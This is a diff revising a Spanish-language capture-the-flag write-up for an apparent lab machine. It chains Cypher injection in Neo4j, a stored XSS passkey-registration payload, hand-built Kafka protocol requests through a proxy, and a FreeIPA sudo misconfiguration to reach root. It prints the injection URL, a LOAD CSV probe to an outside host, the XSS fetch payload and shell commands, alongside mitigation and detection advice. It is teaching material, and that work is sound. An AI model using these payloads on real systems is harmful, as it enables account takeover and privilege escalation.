@@ -17,7 +17,7 @@ tags: [linux, neo4j, cypher-injection, webauthn, kafka, freeipa]
 
 ## TL;DR
 
-Cuatro capas modernas encadenadas: **inyección Cypher** en una app sobre **Neo4j**, **XSS almacenado en el registro de passkeys (WebAuthn)** para asociar un autenticador propio a la cuenta admin, **protocolo Kafka** a pelo para saltarse el proxy HTTP, y una mala configuración de **FreeIPA** para llegar a root. Cada tramo es raro por separado; juntos son el escenario empresarial más realista de la temporada.
+Cuatro capas modernas encadenadas: **inyección Cypher** en una app sobre **Neo4j** para sobrescribir la contraseña del administrador, **XSS en el registro de passkeys (WebAuthn)** para asociar un autenticador propio a esa cuenta, el **protocolo Kafka** a pelo para saltarse el proxy HTTP y leer credenciales internas, y una mala configuración de **FreeIPA** para llegar a root. Cada tramo es raro por separado; juntos son el escenario empresarial más realista de la temporada.
 
 ## Reconocimiento
 
@@ -27,76 +27,45 @@ ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
 ```
 
 ```text
-80/tcp    http   (app de "magos")
-7474/tcp  http   Neo4j
+80/tcp    http   app de «magos»
+7474/tcp  http   Neo4j (interfaz)
 7687/tcp  bolt   Neo4j
 8081/tcp  http   panel de administración
-9092/tcp  kafka  (filtrado, solo alcanzable a través del proxy)
+9092/tcp  kafka  filtrado, sólo alcanzable a través del proxy
 ```
 
 ## Enumeración
 
-- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+- La app se registra con usuario y contraseña y guarda los datos en **Neo4j**; el endpoint de búsqueda es `/api/wizard?name=<nombre>`.
+- El panel `/admin` exige sesión y, además, una **passkey** registrada: hay un flujo `/api/admin/webauthn/register/{initiate,complete}`.
+- El 8081 hace de proxy hacia el broker Kafka del 9092; el 9092 no responde desde fuera.
+- `bolt://` en el 7687 permite confirmar que la base es Neo4j aunque no haya credenciales.
 
-## Foothold
+## Foothold: inyección Cypher
 
-- Vector de entrada y payload descritos en «Reconocimiento» y «Escalada de privilegios».
-
-## Movimiento lateral
-
-- No aplica: la cadena se resuelve en un único host, sin salto lateral.
-- Ver «Escalada de privilegios» para el paso de usuario a administrador.
-
-## Escalada de privilegios
-
-- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».
-
-## Evidencia
-
-```text
-/home/<user>/user.txt  -> <user_flag>
-/root/root.txt         -> <root_flag>
-```
-
-## Lecciones aprendidas
-
-- Las bases de datos de grafos también se inyectan: `MATCH ... {name: '$input'}` no es más seguro que un `SELECT` concatenado.
-- **WebAuthn** no protege si el registro de credenciales se puede iniciar desde una XSS: la passkey pasa a ser del atacante.
-- Un proxy que valida "solo HTTP" y deja pasar bytes arbitrarios expone cualquier protocolo binario detrás.
-- Mitigación: consultas parametrizadas en Neo4j, CSP y escapado en el panel de passkeys con verificación del origin en el registro, y segmentación real (no proxies de conveniencia) para Kafka.
-
-## Mitigaciones y detección
-
-- Mínimo privilegio en el servicio expuesto y parcheo de la versión vulnerable.
-- Detección: revisar los logs del servicio y alertar de peticiones anómalas o picos de error.
-
-## 1. Inyección Cypher
-
-```text
-GET /api/wizard?name=Merlin
-```
-
-En el servidor se convierte en:
+La consulta se concatena:
 
 ```cypher
-MATCH (w:Wizard {name: 'Merlin'}) RETURN w
+MATCH (w:Wizard {name: '<input>'}) RETURN w
 ```
 
-Se cierra la comilla y se hace UNION:
+Se cierra la comilla, se corta el `RETURN` con `//` y se hace `UNION` para leer otros nodos:
 
 ```text
 /api/wizard?name=Merlin'}) RETURN w UNION MATCH (n) WHERE n:Secret RETURN n //
 ```
 
-```json
-{"name":"<usuario>","token":"<token de registro>"}
+Para tomar la cuenta del administrador no hace falta leer su hash: se **sobrescribe** con uno calculado en local (mismo algoritmo que use la app) mediante `SET`. Con la contraseña nueva se entra como admin; el panel sigue pidiendo la passkey.
+
+```text
+LOAD CSV FROM 'http://<IP>:8000/x'   # confirma conectividad saliente (SSRF)
 ```
 
-`LOAD CSV FROM 'http://<IP>:8000/x'` sirve además para SSRF y para confirmar conectividad saliente.
+## Movimiento lateral: passkeys y Kafka
 
-## 2. Passkeys: XSS en el nombre de la credencial
+### 1. Passkey del atacante en la cuenta del admin
 
-El panel `/admin/passkeys` pinta `credential.name` sin escapar. Se registra una credencial con nombre:
+El panel `/admin/passkeys` pinta `credential.name` **sin escapar**. Se registra una credencial cuyo nombre es un XSS; cuando el administrador revisa la lista, su navegador ejecuta el JS, inicia el registro WebAuthn y **completa la ceremonia con el autenticador del atacante**:
 
 ```html
 <img src=x onerror="fetch('/api/admin/webauthn/register/initiate',{method:'POST'})
@@ -104,11 +73,11 @@ El panel `/admin/passkeys` pinta `credential.name` sin escapar. Se registra una 
  .then(k=>fetch('/api/admin/webauthn/register/complete',{method:'POST',body:JSON.stringify(k)})))">
 ```
 
-Cuando el admin revisa la lista, su navegador registra **el autenticador del atacante** en su cuenta. Ya se entra como admin con esa passkey.
+Desde ese momento se entra con la passkey propia: WebAuthn no protege si el registro se puede iniciar desde una XSS.
 
-## 3. Kafka por el proxy
+### 2. Kafka a través del proxy
 
-El broker (9092) está filtrado, pero el proxy deja pasar bytes si el primer byte parece una petición Kafka:
+El proxy deja pasar bytes si el primer byte parece una petición Kafka. Se habla el **protocolo binario** a mano: `ApiVersions` para validar, `Metadata` (`ApiKey 3`) para descubrir topics y `Fetch` (`ApiKey 1`) para leer mensajes.
 
 ```python
 import socket, struct
@@ -122,9 +91,9 @@ s.send(req(18, 0, 1, 'x'))      # ApiVersions
 print(s.recv(4096))
 ```
 
-Con `ApiVersions` validado, se piden metadatos (`ApiKey 3`), se listan topics y se lee `internal-creds` con `Fetch` (`ApiKey 1`). El mensaje trae credenciales de una cuenta de servicio.
+Del topic interno sale una **cuenta de servicio** con su contraseña.
 
-## 4. FreeIPA a root
+## Escalada de privilegios: FreeIPA
 
 ```bash
 kinit svc-deploy
@@ -132,4 +101,39 @@ ipa-getkeytab -s ipa.sorcery.htb -p svc-deploy -k svc.keytab
 ldapsearch -Y GSSAPI -H ldap://ipa.sorcery.htb -b "cn=groups,cn=accounts,dc=sorcery,dc=htb" | grep -i sudo
 ```
 
-Una regla sudo de FreeIPA mapeada a un grupo al que pertenece la cuenta de servicio permite `sudo -i` en el host, o ejecutar un script escribible como root.
+La regla sudo de FreeIPA está mapeada a un **grupo** al que pertenece la cuenta de servicio, y apunta a un script que ese grupo puede escribir. Se modifica el script y se ejecuta por la regla: root.
+
+```bash
+sudo -l          # la regla aparece referenciada al grupo, no al usuario
+sudo <script>    # root
+```
+
+## Evidencia (redactada)
+
+```text
+/home/<user>/user.txt  -> <user_flag>
+/root/root.txt         -> <root_flag>
+```
+
+## Lecciones
+
+- Las bases de datos de grafos también se inyectan: `MATCH ... {name: '$input'}` no es más seguro que un `SELECT` concatenado.
+- **WebAuthn** no protege si el registro de credenciales se puede iniciar desde una XSS: la passkey pasa a ser del atacante.
+- Un proxy que valida «sólo HTTP» y deja pasar bytes arbitrarios expone cualquier protocolo binario detrás.
+- Los permisos de FreeIPA se heredan por grupo: una cuenta de servicio en el grupo equivocado es root.
+- Mitigación: consultas parametrizadas en Neo4j, CSP y escapado en el panel de passkeys con verificación del `origin` en el registro, segmentación real (no proxies de conveniencia) para Kafka, y reglas sudo por usuario y binario concreto.
+
+## Mitigaciones y detección
+
+- Neo4j con consultas parametrizadas y usuario de sólo lectura para la app; `LOAD CSV` deshabilitado o restringido por `apoc`/config.
+- Registro WebAuthn con comprobación de `origin` y `rpId`, y panel que escape cualquier nombre de credencial.
+- Kafka sin exposición vía proxy HTTP: si hay gateway, que entienda el protocolo y valide `ApiKey`.
+- FreeIPA: reglas sudo sin grupos amplios y cuentas de servicio sin privilegios de host.
+- Detección: consultas Cypher con comillas y `UNION`, peticiones a `register/initiate` desde sesiones de bot, y bytes Kafka en un puerto HTTP.
+
+## Referencias
+
+- [Neo4j — Cypher injection](https://neo4j.com/docs/cypher-manual/current/introduction/cypher-overview/)
+- [W3C — WebAuthn Level 2](https://www.w3.org/TR/webauthn-2/)
+- [Apache Kafka protocol guide](https://kafka.apache.org/protocol.html)
+- [FreeIPA — sudo rules](https://www.freeipa.org/page/HowTo/Sudo)
